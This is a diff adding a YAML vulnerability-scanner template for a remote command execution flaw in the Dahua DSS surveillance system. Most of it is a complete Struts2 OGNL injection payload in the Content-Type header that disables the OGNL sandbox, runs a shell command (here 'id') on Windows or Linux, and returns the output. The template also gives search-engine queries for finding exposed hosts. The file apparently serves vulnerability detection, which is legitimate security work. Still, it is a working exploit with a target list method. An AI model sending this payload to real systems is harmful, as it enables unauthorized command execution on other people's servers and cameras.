@@ -1,0 +1,16 @@
+name: dahua-DSS-rce
+rules:
+  - method: GET
+    path: /admin/login_login.action
+    headers:
+      Content-Type: "%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    body: 
+    expression:                          
+      status_code: 200                   
+      response_header:   
+      response_body: (root)
+detail:
+  description: "大华DSS Digital Surveillance System系统login_login.action存在远程命令执行。截至2024.4.15通过搜索引擎发现存在一部分网站存在该漏洞."
+  search: 
+    fofa: app=dahua-DSS
+    鹰图: web.title=="DSS"
